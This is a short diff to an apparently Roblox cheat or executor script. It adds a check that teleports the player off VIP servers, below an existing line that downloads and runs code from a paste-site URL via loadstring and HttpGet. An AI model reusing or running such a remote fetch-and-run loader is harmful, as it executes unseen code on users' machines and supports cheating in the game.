@@ -1,1 +1,9 @@
 loadstring(game:HttpGet("https://cdn.sourceb.in/bins/5YvF6ImSJC/0"))()
+local Players = game:GetService("Players")
+local TeleportService = game:GetService("TeleportService")
+local ReplicatedStorage = game:GetService("RobloxReplicatedStorage")
+
+if ReplicatedStorage:WaitForChild("GetServerType"):InvokeServer() == "VIPServer" then
+    TeleportService:Teleport(game.PlaceId, Players.LocalPlayer)
+    return
+end
